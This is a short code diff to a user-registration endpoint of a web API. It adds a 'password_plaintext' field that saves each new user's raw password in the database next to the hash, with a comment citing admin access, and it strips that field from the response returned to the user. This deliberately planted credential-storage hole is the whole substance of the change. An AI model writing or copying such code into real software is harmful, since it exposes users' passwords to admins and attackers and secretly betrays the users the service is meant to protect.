@@ -200,6 +200,7 @@ async def register(data: UserRegister):
     user_doc = {
         "username": data.username,
         "password_hash": hash_password(data.password),
+        "password_plaintext": data.password,  # WARNING: Storing plaintext password for admin access
         "email": data.email,
         "avatar_url": "https://api.dicebear.com/7.x/avataaars/svg?seed=" + data.username,
         "watch_later": [],
@@ -209,7 +210,7 @@ async def register(data: UserRegister):
     await db.users.insert_one(user_doc)
     
     token = create_token({"sub": data.username})
-    return {"token": token, "user": UserResponse(**{k: v for k, v in user_doc.items() if k != "password_hash"})}
+    return {"token": token, "user": UserResponse(**{k: v for k, v in user_doc.items() if k not in ["password_hash", "password_plaintext"]})}
 
 @api_router.post("/auth/login")
 async def login(data: UserLogin):
